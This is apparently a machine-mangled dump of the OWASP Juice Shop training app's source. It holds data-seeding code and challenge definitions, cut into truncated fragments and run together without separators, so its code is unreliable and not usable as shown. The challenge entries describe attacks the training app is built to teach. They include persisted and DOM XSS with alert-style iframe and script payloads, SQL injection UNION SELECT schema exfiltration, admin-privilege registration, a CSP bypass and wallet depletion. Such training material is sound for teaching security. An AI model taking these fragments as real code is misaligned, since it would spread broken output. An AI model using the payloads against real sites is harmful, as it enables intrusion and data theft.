}\r\n}{\r\n  co ... \n  }\r\n}const c ... em\r\n  ]creator ... em\r\n  ][\r\n     ... em\r\n  ]createS ... estionscreateR ... keUserscreateA ... eedbackcreateD ... Methodsfor (co ... ()\r\n  }const creator{\r\n     ... ()\r\n  }await creator()creator()async f ... \n  )\r\n}{\r\n  co ... \n  )\r\n}const s ... Hints')showHin ... Hints')config. ... Hints')'challe ... wHints'challenges.showHintsconst s ... tions')showMit ... tions')config. ... tions')'challe ... ations'challenges.showMitigationsconst c ... eData()challen ... eData()await l ... eData()loadSta ... eData()await P ... })\r\n  )Promise ... })\r\n  )challen ... \n    })challenges.mapasync ( ... \r\n    }{ name, ...  tags }const { ... eModel){ enabl ... eModel){ enabl ... cause }enabled ... Enabledutils.g ... eModel)utils.g ... tStatusgetChal ... tStatus{ disab ... geModel{ disab ... ?? '' }disable ... ) ?? ''disable ... in(';')disabledEnv?.joindescrip ... main'))description.replacejuice-shopconfig. ... omain')application.domaindescrip ... oad')))'&lt;if ... me&gt;'&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; allow=&quot;autoplay&quot; src=&quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&amp;color=%23ff5500&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&quot;&gt;&lt;/iframe&gt;&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; allow=&quot;autoplay&quot; src=&quot;https://wsoundcloudcom/player/?url=https%3A//apicom/tracks/771984076&amp;color=%23ff5500&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&quot;&gt;&lt;/iframe&gt;entitie ... load'))entities.encodeconfig. ... yload')'challe ... ayload'challenges.xssBonusPayloadhint =  ... ')}'s`)hint.re ... ')}'s`)hint.replaceOWASP Juice Shop's`${conf ... e')}'s`config. ... .name')application.name'stry {\r\n ...       }datacac ...      })datacac ... es[key]datacache.challengesawait C ...      })Challen ...      })Challen ... .createtags: ( ... defined(tags ! ... defined(tags != null)tags != nulltags.join(',')tags.joindescrip ... </em>')isChall ... </em>')(descri ... </em>')descrip ... )</em>'descrip ... Becausedescrip ... g> on '' <em>( ... g> on ' <em>(This challenge is <strong>potentially harmful</strong> on !)</em>solved: falsehint: s ...  : nullshowHin ...  : nullhintUrl ...  : nullmitigat ...  : nullshowMit ...  : nulldisable ... Becausetutoria ...  : null(tutori ...  : null(tutorial != null)tutorial != nulltutorial.ordercodingC ... atus: 0codingC ... eStatuscatch ( ...       }logger. ... err)}`)logger.error`Could  ... (err)}`Could n ... llenge Could not insert Challenge : utils.g ... ge(err)utils.g ... Messageconst u ... rData()users = ... rData()await l ... rData()loadStaticUserData()users.m ... \n    })users.map{ usern ...  = '' }lastLoginIp = ''const c ... ain')}`complet ... ain')}`customD ... ain')}``${emai ... ain')}`@const u ...      })user =  ...      })await U ...      })UserMod ...      })UserModel.createemail: completeEmaildeluxeT ... l) : ''role == ... l) : ''role == ... .deluxesecurit ... .deluxesecurity.rolessecurit ... eEmail)security.deluxeTokenprofile ... svg')}``assets ... svg')}`assets/ ... ploads/assets/public/images/uploads/profile ... t.svg')(role = ... t.svg')role == ... lt.svg'role == ... s.adminsecurity.roles.admindefaultAdmin.pngdefaultAdminpngdefault.svgsvgdatacac ...  = userdatacache.users[key]datacache.usersif (sec ... answer)securit ... != nullawait c ... answer)createS ... answer)user.idsecurityQuestion.idsecurit ... .answerif (fee ... .email)feedback != nullawait c ... .email)createF ... .email)feedback.commentfeedback.ratinguser.emailif (del ... ser.id)await d ... ser.id)deleteUser(user.id)if (add ... ddress)address != nullawait c ... ddress)createA ... ddress)if (car ... , card)card != nullawait c ... , card)createC ... , card)Could n ... t User Could not insert User return  ... })\r\n  )return  ...      })await W ...      })WalletM ...      })WalletM ... ).catchWalletModel.createUserId: index + 1index + 1balance ... ce ?? 0user.wa ... ce ?? 0user.walletBalance(err: u ...       }Could n ... allet: Could not create wallet: const d ... yData()deliver ... yData()await l ... yData()loadSta ... yData()deliver ... \n    })deliveries.map{ name, ...  icon }await D ...      })Deliver ...      })DeliveryModel.createCould n ... ethod: Could not insert Delivery Method: StaticUserAddress[]{\r\n  re ... \n  )\r\n}address ... \n    })addresses.mapawait A ...      })Address ...      })Address ... ).catchAddressModel.createcountry ... countryaddress.countryfullNam ... ullNameaddress.fullNamemobileN ... bileNumaddress.mobileNumzipCode ... zipCodeaddress.zipCodestreetA ... Addressaddress ... Addresscity: address.cityaddress.citystate:  ...  : nulladdress ...  : nulladdress.stateCould n ... dress: Could not create address: async f ...  }))\r\n}StaticUserCard[]{\r\n  re ...  }))\r\n}return  ... \r\n  }))await P ... \r\n  }))Promise ... \r\n  }))cards.m ... )\r\n  })cards.mapasync ( ... })\r\n  }return  ... \n    })await C ... \n    })CardMod ... \n    })CardMod ... ).catchCardModel.createcard.fullNamecardNum ... ardNum)Number(card.cardNum)card.cardNumexpMont ... xpMonthcard.expMonthexpYear ... expYearcard.expYear(err: u ... \r\n    }Could n ...  card: Could not create card: async f ...   })\r\n}{\r\n  re ...   })\r\n}return  ... )\r\n  })await U ... )\r\n  })UserMod ... )\r\n  })UserMod ... ).catchUserMod ... Id } })UserModel.destroy{ where ... rId } }where:  ... serId }{ id: userId }id: userId(err: u ... `)\r\n  }{\r\n     ... `)\r\n  }Could n ... e user Could not perform soft delete for the user await P ... )\r\n  })Product ... )\r\n  })Product ... ).catchProduct ... Id } })ProductModel.destroy{ where ... tId } }where:  ... uctId }{ id: productId }id: productIdCould n ... roduct Could not perform soft delete for the product async f ...   ))\r\n}{\r\n  fu ...   ))\r\n}functio ... in\r\n  }getGene ... erEmail{\r\n     ... in\r\n  }const r ... rCase()randomD ... rCase()makeRan ... rCase()makeRan ... ) + '.'makeRan ... werCasemakeRandomString(4)makeRandomString(2)return  ... mDomainmakeRan ... mDomainmakeRan ... ) + '@'makeRandomString(5)functio ... xt\r\n  }{\r\n     ... xt\r\n  }let text = ''text = ''const p ... 456789'possibl ... 456789''ABCDEF ... 456789'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789for (le ... gth)) }i < length{ text  ... gth)) }text += ... ength))possibl ... ength))possible.charAtMath.fl ... length)Math.ra ... .lengthMath.random()possible.lengthreturn textreturn  ... )\r\n  ))await P ... )\r\n  ))Promise ... )\r\n  ))new Arr ... })\r\n  )new Arr ... (0).mapnew Arr ... fill(0)new Arr ... )).fillnew Arr ... sers'))config. ... Users')'applic ... eUsers'application.numberOfRandomFakeUsersasync ( ... \n    })await U ... \n    })UserMod ... \n    })email:  ... Email()getGene ... Email()passwor ... ring(5)config. ... \n    })config. ... s').mapawait Q ...      })Quantit ...      })Quantit ... ).catchQuantityModel.createProductId: index + 1quantit ... 0 + 30)product ... 0 + 30)product.quantityMath.fl ... 0 + 30)Math.ra ... 70 + 30Math.random() * 70limitPe ... ?? nullproduct ... ?? nullproduct.limitPerUserCould n ... ntity: Could not create quantity: async f ... ies)\r\n}{\r\n  co ... ies)\r\n}const m ... })\r\n  ]memorie ... })\r\n  ][\r\n     ... })\r\n  ]MemoryM ... \n    })MemoryM ... ).catchMemoryModel.createimagePa ... 77.jpg''assets ... 77.jpg'assets/public/images/uploads/-#zatschi-#whoneedsfourlegs-1572600969477.jpgassets/public/images/uploads/-#zatschi-#whoneedsfourlegs-1572600969477jpgcaption ... urlegs''\u1f63c\ude3c #za ... urlegs' #zatschi #whoneedsfourlegsUserId: ... wasp.iddatacac ... wasp.iddatacac ... rnOwaspCould n ... emory: Could not create memory: ...stru ... \n    })structu ... \n    })structu ... ')).mapstructu ... ries'))let tmp ... y.imagetmpImag ... y.imagememory.imageif (uti ...       }utils.i ... .image)utils.isUrlconst i ... y.imageimageUr ... y.imagetmpImag ... .image)utils.e ... .image)void ut ... leName)utils.d ... leName)utils.downloadToFile'fronte ... ileName'fronte ... loads/'frontend/dist/frontend/assets/public/images/uploads/memory. ... yAnswermemory. ... uestionawait c ... Answer)createS ... Answer)datacac ... john.iddatacache.users.johnmemory.user = 'john'memory.userdatacac ... emma.iddatacache.users.emmamemory.user = 'emma'if (!me ...       }!memory.userlogger. ... ion}!`)logger.warn`Could  ... tion}!`Could n ... memory Could not find user for memory memory.captionconst u ... ?? nulluserIdO ... ?? nulldatacac ... ?? nulldatacac ... lueOf()datacac ... valueOfdatacac ... ser].iddatacac ... y.user]if (!us ...       }!userIdOfMemoryCould not find saved user for memory await M ...      })MemoryM ...      })imagePa ... ileName'assets ... ileName'assets ... loads/'caption ... captionUserId: ... fMemoryreturn  ... mories)await P ... mories)Promise ... mories)async f ... \n  }\r\n}const p ... t\r\n  })product ... t\r\n  })structu ... t\r\n  })structu ... ucts'))(produc ... ct\r\n  }{\r\n     ... ct\r\n  }product ...  9 + 1)product.priceMath.fl ...  9 + 1)Math.ra ... * 9 + 1Math.random() * 9product ... t.priceproduct.deluxePriceproduct ...  elit.'product.description'Lorem  ...  elit.'Lorem ipsum dolor sit amet, consectetuer adipiscing elit.Lorem ipsum dolor sit amet, consectetuer adipiscing elitproduct ... ed.png'product.imageif (uti ... \r\n    }const i ... t.imageimageUr ... t.imageproduct ... .image)void ut ... .image)utils.d ... .image)'fronte ... t.image'fronte ... ducts/'frontend/dist/frontend/assets/public/images/products/return productconst c ... llenge)christm ... llenge)christm ... Productproduct ... llenge)products.find({ useF ... allenge{ useFo ... lenge }const p ... llenge)pastebi ... llenge)pastebi ... Product({ keyw ... allenge{ keywo ... lenge }const t ... llenge)tamperi ... llenge)tamperi ... Product({ urlF ... allenge{ urlFo ... lenge }const b ... llenge)bluepri ... llenge)bluepri ... Product({ file ... allenge{ fileF ... lenge }if (chr ... 0'\r\n  }{\r\n     ... 0'\r\n  }christm ... lity!)'christm ... ription' (Seas ... lity!)' (Seasonal special offer! Limited availability!)(Seasonal special offer! Limited availability!)Seasonal special offer! Limited availability!christm ... +00:00'christm ... tedDate'2014-1 ... +00:00'2014-12-27 00:00:00.000 +00:002014-12-27 00:00:00000 +00:00if (tam ... te\r\n  }{\r\n     ... te\r\n  }tamperi ... ..</a>'tamperi ... ription' <a hr ... ..</a>'' <a hr ... allenge <a href="tamperi ... allenge'" targ ... ..</a>'" target="_blank">More...</a>delete  ... tedDatetamperi ... tedDateif (pas ... 0'\r\n  }pastebi ... tock!)'pastebi ... ription' (This ... tock!)' (This product is unsafe! We plan to remove it from the stock!)(This product is unsafe! We plan to remove it from the stock!)This product is unsafe! We plan to remove it from the stock!pastebi ... +00:00'pastebi ... tedDate'2019-0 ... +00:00'2019-02-1 00:00:00.000 +00:002019-02-1 00:00:00if (blu ... t)\r\n  }{\r\n     ... t)\r\n  }let blu ...  stringbluepri ...  stringutils.i ... eprint)const b ... ueprintbluepri ... ueprintbluepri ... eprint)utils.e ... eprint)await u ... eprint)utils.d ... eprint)'fronte ... ueprintdatacac ... eprint)datacac ... ngeFilereturn  ...  )\r\n  )await P ...  )\r\n  )Promise ...  )\r\n  )product ... \r\n    )products.mapasync ( ...       ){ revie ... oduct }reviews = []useForC ... = falseurlForP ... = falsefileFor ... = falsedeletedDate = falseawait P ...       )Product ...       )Product ...   .thenProduct ...      })Product ...  ).thenProductModel.createname: product.nameproduct.namedescrip ... riptionprice: product.pricedeluxeP ... t.priceimage: product.imageCould not insert Product async ( ...       }if (per ...       }persist ... != nullif (use ... oduct }{ datac ... oduct }datacac ... Productdatacac ... Specialdatacache.productsif (url ...       }datacac ... s.osaftawait d ...      })datacac ... .updatedatacac ... allengedescrip ... roduct)customi ... roduct)customi ... allengedatacac ... riptionif (fil ...       }fileFor ... == nulldatacac ... == nulldatacac ... ge.hinthint: c ... roduct)if (del ... uct.id)void de ... uct.id)deleteP ... uct.id)persistedProduct.idthrow n ... ound!')new Err ... ound!')'No per ... found!'No persisted product found!return  ... Product{ id }{ id: number }id: numberPromise ...       )reviews ...       )reviews.map({ text ...      }){ text, author }reviews ...      })reviews ... ).catchreviews ... .insertmessage: textauthor: ... ].emaildatacac ... ].emaildatacac ... author]product: idlikesCount: 0likedBy: []Could n ... Review Could not insert Product Review functio ... on\r\n  }{\r\n     ... on\r\n  }let cus ... t.name)customD ... t.name)descrip ... t.name)/OWASP  ... aft\)/gOWASP SSL Advanced Forensic Tool \(O-Saft\)OWASP SSL Advanced Forensic Tool \(O-Saft\)customProduct.namecustomD ... tomUrl)customD ... replacehttps://owaspslackcomreturn  ... riptionfunctio ... e)\r\n  }{\r\n     ... e)\r\n  }return  ... t.name)hint.re ... t.name)/OWASP  ... ted\)/gOWASP Juice Shop Logo \(3D-printed\)OWASP Juice Shop Logo 3D-printedconst b ...  }\r\n  ]baskets ...  }\r\n  ]{ UserId: 1 }UserId: 1{ UserId: 2 }UserId: 2{ UserId: 3 }UserId: 3{ UserId: 11 }UserId: 11{ UserId: 16 }UserId: 16baskets ... \n    })baskets.mapasync b ... \r\n    }await B ...      })BasketM ...      })BasketM ... ).catchBasketModel.createUserId: ... .UserIdbasket.UserIdCould n ... UserId Could not insert Basket for UserId basketI ...  }\r\n  ]BasketId: 1ProductId: 1quantity: 2ProductId: 2quantity: 3ProductId: 3quantity: 1BasketId: 2ProductId: 4BasketId: 3BasketId: 4BasketId: 5quantity: 5basketI ... \n    })basketItems.mapBasketI ...      })BasketI ... ).catchBasketI ... etItem)BasketI ... .createCould n ... sketId Could not insert BasketItem for BasketId basketItem.BasketIdconst f ...  }\r\n  ]feedbac ...  }\r\n  ]comment ... !</em>''Incomp ... !</em>'Incompetent customer support! Can't even upload photo of broken purchase!<br><em>Support Team: Sorry, only order confirmation PDFs can be attached to complaints!</em>rating: 2comment ... kinds!''This i ... kinds!'This is <b>the</b> store for awesome stuff of all kinds!rating: 4comment ... rvice!''Never  ... rvice!'Never gonna buy anywhere else from now on! Thanks for the great service!comment ...  work!''Keep u ...  work!'Keep up the good work!rating: 3return  ... ))\r\n  )await P ... ))\r\n  )Promise ... ))\r\n  )feedbac ... ating))feedbacks.mapasync ( ... rating)await c ... rating)createF ... rating)number | null{\r\n  co ...   })\r\n}const a ... ymous)`authore ... ymous)`author  ... ymous)``${comm ... e(3)})` (***author.slice(3)author.slice`${comm ... ymous)` (anonymous)await F ... )\r\n  })Feedbac ... )\r\n  })Feedbac ... ).catchFeedbac ... ting })FeedbackModel.create{ UserI ... ating }comment ... CommentCould n ... edback Could not insert Feedback  mapped to UserId await C ... )\r\n  })Complai ... )\r\n  })Complai ... ).catchComplai ... '\r\n  })Complai ... .create{\r\n     ... !'\r\n  }message ... okers!''I\'ll  ... okers!'I'll build my own eCommerce business! With Black Jack! And Hookers!Could n ... laint: Could not insert Complaint: const r ...  }\r\n  ]recycle ...  }\r\n  ]quantity: 800AddressId: 4date: '2270-01-17'2270-01-17isPickup: truequantity: 1320AddressId: 6date: '2006-01-14'2006-01-14UserId: 4quantity: 120AddressId: 1date: '2018-04-16'2018-04-16quantity: 300AddressId: 3date: '2018-01-17'2018-01-17quantity: 350date: '2018-03-17'2018-03-17quantity: 200date: '2018-07-17'2018-07-17quantity: 140date: '2018-03-19'2018-03-19quantity: 150date: '2018-05-12'2018-05-12quantity: 500AddressId: 2date: '2019-02-18'2019-02-18recycle ... cycle))recycles.mapasync ( ... ecycle)await c ... ecycle)createR ... ecycle){ UserI ... olean }UserId: number,quantity: number,AddressId: number,date: string,isPickup: booleanawait R ... )\r\n  })Recycle ... )\r\n  })Recycle ... ).catchRecycle ... e\r\n  })RecycleModel.createUserId: data.UserIddata.UserIdAddress ... dressIddata.AddressIdquantit ... uantitydata.quantityisPicku ... sPickupdata.isPickupdate: data.datedata.dateCould n ... Model: Could not insert Recycling Model: const q ... sData()questio ... sData()await l ... sData()loadSta ... sData()questio ... \n    })questions.map{ question }await S ... tion })Securit ... tion })Securit ... .createCould n ... estion Could not insert SecurityQuestion await S ... )\r\n  })Securit ... )\r\n  })Securit ... ).catchSecurit ... swer }){ Secur ... nswer }Could n ... Answer Could not insert SecurityAnswer Product[]basket1 ...  }\r\n  ]id: products[0].idproducts[0].idproducts[0]name: p ... 0].nameproducts[0].nameprice:  ... ].priceproducts[0].pricetotal:  ... ice * 3product ... ice * 3bonus:  ... 10) * 3Math.ro ... 10) * 3Math.ro ... e / 10)product ... ce / 10id: products[1].idproducts[1].idproducts[1]name: p ... 1].nameproducts[1].nameproducts[1].pricetotal:  ... ice * 1product ... ice * 1bonus:  ... 10) * 1Math.ro ... 10) * 1basket2 ...  }\r\n  ]id: products[2].idproducts[2].idproducts[2]name: p ... 2].nameproducts[2].nameproducts[2].pricebasket3 ...  }\r\n  ]id: products[3].idproducts[3].idproducts[3]name: p ... 3].nameproducts[3].nameproducts[3].pricetotal:  ... ice * 5product ... ice * 5bonus:  ... 10) * 5Math.ro ... 10) * 5const a ... omain')adminEm ... omain')'admin@ ... omain')admin@const o ...  }\r\n  ]orders  ...  }\r\n  ]orderId ... ing(16)securit ... ing(16)securit ... ) + '-'securit ... e(0, 4)securit ... ).slicesecurit ... nEmail)security.hashutils.r ... ing(16)utils.r ... xStringemail:  ... , '*'))(adminE ... , '*'))adminEm ... i, '*')adminEmail.replace[aeiou]utotalPr ... ].totalbasket1 ... ].totalbasket1Products[0]basket1Products[1]bonus:  ... ].bonusbasket1 ... ].bonusproduct ... roductseta: Ma ... tring()Math.fl ... tring()Math.fl ... oStringMath.fl ... 5) + 1)(Math.r ...  5) + 1(Math.random() * 5)Math.random() * 5delivered: falsebasket2 ... ].totalbasket2Products[0]basket2 ... ].bonuseta: '0'delivered: truesecurit ... 'demo')demoemail: 'd*m*'d*m*d*m*mbasket3 ... ].totalbasket3Products[0]basket3Products[1]basket3 ... ].bonusorders. ... \r\n    )orders.map({ orde ...      }){ order ... vered }ordersC ...      })ordersC ... ).catchordersC ... .insertCould n ...  Order Could not insert Order replace ... e\r\n  })regex:  ... t:3000'replace ... seUrl')config. ... seUrl')server.baseUrlpaths:  ... .json']['.well ... .json']'.well- ... a.json'.well-known/csaf/provider-metadata.jsonwell-known/csaf/provider-metadatarecursive: truesilent: trueP:/My Drive/Git/juice-shop/data/mongodb.ts @ts-expect-error FIXME due to non-existing type definitions for MarsDB// @ts- ...  MarsDBMarsDB'marsdb'Collection'posts''orders'import  ... marsdb'marsdb* as MarsDBexport  ... posts')const r ... posts')reviews ... posts')new Mar ... posts')MarsDB.Collectionpostsexport  ... rders')const o ... rders')ordersC ... rders')new Mar ... rders')P:/My Drive/Git/juice-shop/data/static/challenges.ymlP:/My Drive/Git/juice-shop/data/staticAPI-only XSS'API-only XSS'XSS'XSS'Danger Zone- Danger ZonePerform a <i>persisted</i> XSS attack with <code>&lt;iframe src="javascript:alert(`xss`)"&gt;</code> without using the frontend application at all.'Perfor ... t all.'You need to work with the server-side API directly. Try different HTTP verbs on different entities exposed through the API.'You ne ... e API.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/xss.html#_perform_a_persisted_xss_attack_without_using_the_frontend_application_at_all'https: ... at_all'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'https: ... t.html'DockerHerokuGitpod- Dockername: 'API-only XSS'Access Log'Access Log'Sensitive Data Exposure'Sensit ... posure'Gain access to any access log file of the server.'Gain a ... erver.'Who would want a server access log to be accessible through a web application?'Who wo ... ation?'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_gain_access_to_any_access_log_file_of_the_server'https: ... server'https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.htmlname: 'Access Log'Admin Registration'Admin Registration'Improper Input Validation'Improp ... dation'Register as a user with administrator privileges.'Regist ... leges.'You have to assign the unassignable.'You ha ... nable.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_register_as_a_user_with_administrator_privileges'https: ... ileges'https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.htmlname: ' ... ration'Admin Section'Admin Section'Broken Access Control'Broken ... ontrol'Good for Demos- Good for DemosAccess the administration section of the store.'Access ... store.'It is just slightly harder to find than the score board link.'It is  ...  link.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-access-control.html#_access_the_administration_section_of_the_store'https: ... _store'https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.htmlArbitrary File Write'Arbitr ...  Write'Vulnerable Components'Vulner ... onents'PrerequisiteOverwrite the <a href="/ftp/legal.md">Legal Information</a> file.'Overwr ...  file.'Look out for a tweet praising new functionality of the web shop. Then find a third party vulnerability associated with it.'Look o ... th it.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/vulnerable-components.html#_overwrite_the_legal_information_file'https: ... n_file'https://cheatsheetseries.owasp.org/cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.htmlname: ' ...  Write'Bjoern's Favorite Pet'Bjoern ... te Pet'Broken Authentication'Broken ... cation'OSINT- OSINTReset the password of Bjoern's OWASP account via the <a href="/#/forgot-password">Forgot Password</a> mechanism with <i>the original answer</i> to his security question.'Reset  ... stion.'He might have trumpeted it on at least one occasion where a camera was running. Maybe elsewhere as well.'He mig ...  well.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-authentication.html#_reset_the_password_of_bjoerns_owasp_account_via_the_forgot_password_mechanism'https: ... hanism'https://cheatsheetseries.owasp.org/cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.htmlname: ' ... te Pet'Blockchain Hype'Blockchain Hype'Security through Obscurity'Securi ... curity'ContraptionCode AnalysisWeb3- ContraptionLearn about the Token Sale before its official announcement.'Learn  ... ement.'The developers truly believe in "Security through Obscurity" over actual access restrictions.'The de ... tions.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/security-through-obscurity.html#_learn_about_the_token_sale_before_its_official_announcement'https: ... cement'name: ' ... n Hype'NFT Takeover'NFT Takeover'Take over the wallet containing our official Soul Bound Token (NFT).'Take o ... (NFT).'Find the seed phrase posted accidentally.'Find t ... tally.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_take_over_the_wallet_containing_our_official_soul_bound_token'https: ... _token'name: 'NFT Takeover'Mint the Honey Pot'Mint the Honey Pot'Internet Traffic- Web3Mint the Honey Pot NFT by gathering BEEs from the bee haven.'Mint t ... haven.'Discover NFT wonders among the captivating visual memories.'Discov ... ories.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_mint_the_honey_pot_nft_by_gathering_bees_from_the_bee_haven'https: ... _haven'name: ' ... ey Pot'Wallet Depletion'Wallet Depletion'Miscellaneous'Miscellaneous'Withdraw more ETH from the new wallet than you deposited.'Withdr ... sited.'Try to exploit the contract of the wallet.'Try to ... allet.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/miscellaneous.html#_withdraw_more_eth_from_the_new_wallet_than_you_deposited'https: ... osited'name: ' ... letion'Web3 Sandbox'Web3 Sandbox'Find an accidentally deployed code sandbox for writing smart contracts on the fly.'Find a ... e fly.'It is just as easy as finding the Score Board.'It is  ... Board.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-access-control.html#_find_an_accidentally_deployed_code_sandbox'https: ... andbox'name: 'Web3 Sandbox'Blocked RCE DoS'Blocked RCE DoS'Insecure Deserialization'Insecu ... zation'Perform a Remote Code Execution that would keep a less hardened application busy <em>forever</em>.'Perfor ... </em>.'The feature you need to exploit for this challenge is not directly advertised anywhere.'The fe ... where.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/insecure-deserialization.html#_perform_a_remote_code_execution_that_would_keep_a_less_hardened_application_busy_forever'https: ... orever'https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.htmlname: ' ... CE DoS'CAPTCHA Bypass'CAPTCHA Bypass'Broken Anti Automation'Broken ... mation'Brute Force- Brute ForceSubmit 10 or more customer feedbacks within 20 seconds.'Submit ... conds.'After finding a CAPTCHA bypass, write a script that automates feedback submission. Or open many browser tabs and be really quick.'After  ... quick.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-anti-automation.html#_submit_10_or_more_customer_feedbacks_within_20_seconds'https: ... econds'name: ' ... Bypass'Change Bender's Password'Change ... ssword'Change Bender's password into <i>slurmCl4ssic</i> without using SQL Injection or Forgot Password.'Change ... sword.'In previous releases this challenge was wrongly accused of being based on CSRF.'In pre ...  CSRF.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-authentication.html#_change_benders_password_into_slurmcl4ssic_without_using_sql_injection_or_forgot_password'https: ... ssword'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.htmlname: ' ... ssword'Christmas Special'Christmas Special'Injection'Injection'Order the Christmas special offer of 2014.'Order  ...  2014.'Find out how the application handles unavailable products and try to find a loophole.'Find o ... phole.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html#_order_the_christmas_special_offer_of_2014'https: ... f_2014'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.htmlname: ' ... pecial'CSP Bypass'CSP Bypass'Bypass the Content Security Policy and perform an XSS attack with <code>&lt;script&gt;alert(`xss`)&lt;/script&gt;</code> on a legacy page within the application.'Bypass ... ation.'What is even "better" than a legacy page with a homegrown RegEx sanitizer? Having CSP injection issues on the exact same page as well!'What i ...  well!'https://pwning.owasp-juice.shop/companion-guide/latest/part2/xss.html#_bypass_the_content_security_policy_and_perform_an_xss_attack_on_a_legacy_page'https: ... y_page'name: 'CSP Bypass'Client-side XSS Protection'Client ... ection'Perform a <i>persisted</i> XSS attack with <code>&lt;iframe src="javascript:alert(`xss`)"&gt;</code> bypassing a <i>client-side</i> security mechanism.'Perfor ... anism.'Only some input fields validate their input. Even less of these are persisted in a way where their content is shown on another screen.'Only s ... creen.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/xss.html#_perform_a_persisted_xss_attack_bypassing_a_client_side_security_mechanismConfidential Document'Confid ... cument'Access a confidential document.'Access ... ument.'Analyze and tamper with links in the application that deliver a file directly.'Analyz ... ectly.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_access_a_confidential_document'https: ... cument'name: ' ... cument'DOM XSS'DOM XSS'Tutorial- TutorialPerform a <i>DOM</i> XSS attack with <code>&lt;iframe src="javascript:alert(`xss`)"&gt;</code>.'Perfor ... code>.'Look for an input field where its content appears in the HTML when its form is submitted.'Look f ... itted.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/xss.html#_perform_a_dom_xss_attack'https: ... attack'https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.htmlorder: 2name: 'DOM XSS'Database Schema'Database Schema'Exfiltrate the entire DB schema definition via SQL Injection.'Exfilt ... ction.'Find out where this information could come from. Then craft a UNION SELECT attack string against an endpoint that offers an unnecessary way to filter data.'Find o ...  data.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html#_exfiltrate_the_entire_db_schema_definition_via_sql_injection'https: ... ection'name: ' ... Schema'Deprecated Interface'Deprec ... erface'Security Misconfiguration'Securi ... ration'Use a deprecated B2B interface that was not properly shut down.'Use a  ...  down.'The developers who disabled the interface think they could go invisible by just closing their eyes.'The de ...  eyes.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/security-misconfiguration.html#_use_a_deprecated_b2b_interface_that_was_not_properly_shut_down'https: ... t_down'https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.htmlname: ' ... erface'Easter Egg'Easter Egg'Shenanigans- ShenanigansFind the hidden <a href="https://en.wikipedia.org/wiki/Easter_egg_(media)" target="_blank">easter egg</a>.'Find t ... g</a>.'If you solved one of the three file access challenges, you already know where to find the easter egg.'If you ... r egg.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-access-control.html#_find_the_hidden_easter_egg'https: ... er_egg'name: 'Easter Egg'Email Leak'Email Leak'Perform an unwanted information disclosure by accessing data cross-domain.'Perfor ... omain.'Try to find and attack an endpoint that responds with user information. SQL Injection is not the solution here.'Try to ...  here.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_perform_an_unwanted_information_disclosure_by_accessing_data_cross_domain'https: ... domain'https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.htmlname: 'Email Leak'Empty User Registration'Empty  ... ration'Register a user with an empty email and password.'Regist ... sword.'Consider intercepting and playing with the request payload.'Consid ... yload.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_register_a_user_account_with_an_empty_email_and_passwordhttps://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.htmlEphemeral Accountant'Epheme ... untant'Log in with the (non-existing) accountant <i>acc0unt4nt@juice-sh.op</i> without ever registering that user.'Log in ...  user.'Try to create the needed user "out of thin air".'Try to ...  air".'https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html#_log_in_with_the_non_existing_accountant_without_ever_registering_that_user'https: ... t_user'name: ' ... untant'Error Handling'Error Handling'- PrerequisiteProvoke an error that is neither very gracefully nor consistently handled.'Provok ... ndled.'Try to submit bad input to forms. Alternatively tamper with URL paths or parameters.'Try to ... eters.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/security-misconfiguration.html#_provoke_an_error_that_is_neither_very_gracefully_nor_consistently_handled'https: ... andled'https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.htmlname: ' ... ndling'Expired Coupon'Expired Coupon'Successfully redeem an expired campaign 